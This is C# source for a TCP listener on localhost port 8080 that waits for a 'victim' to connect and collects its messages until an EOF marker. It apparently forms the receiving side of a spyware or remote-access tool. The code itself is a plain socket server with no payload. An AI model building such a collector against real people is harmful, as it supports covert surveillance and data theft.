using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;

namespace Server
{
    class Listener
    {
        public delegate void listenerCallback(String msg, Socket victimSocket);
        public delegate void delAddLog(String logMessage, String type);
        delAddLog addLog;

        Socket ListenerSocket;
        Socket victimSocket;

        public void startListening(listenerCallback onMessageCallback, delAddLog addLog) {

            this.addLog = addLog;


            IPAddress ipAddr = IPAddress.Parse("127.0.0.1");
            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 8080);

            // Initialize The Server Socket
            ListenerSocket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            ListenerSocket.Bind(localEndPoint);

            addLog("", "ServerLog");

            // Start Listening
            addLog("Server now is listenning on 8080.", "ServerLog");
            ListenerSocket.Listen(10);

            addLog("Waiting for victim to connect...", "ServerLog");
            victimSocket = ListenerSocket.Accept();

            while (true) {
                if(victimSocket.Connected) {
                    readVictimMessages(onMessageCallback);
                }
                else {
                    addLog("", "ServerLog");
                    addLog("Waiting for victim to connect...", "ServerLog");
                    victimSocket = ListenerSocket.Accept();
                }
            }
        }

        private void readVictimMessages(listenerCallback callback) {
            try
            { 
                Byte[] data = new Byte[256];
                String message = "";
                int recByteLength = victimSocket.Receive(data);

                message += Encoding.ASCII.GetString(data, 0, recByteLength);

                // until victim send eof flag
                if (message.IndexOf("<EOF>\n") > -1)
                {
                    message = Regex.Replace(message, "<EOF>\n", "");

                    callback(message, victimSocket);
                    message = "";
                }
            }
            catch (SocketException e)
            {
                // at the end we close the victim socket
                victimSocket.Shutdown(SocketShutdown.Both);
                victimSocket.Close();
                addLog("\nVictim disconnected with an execption", "ServerLog");
            }
        }

    }
}
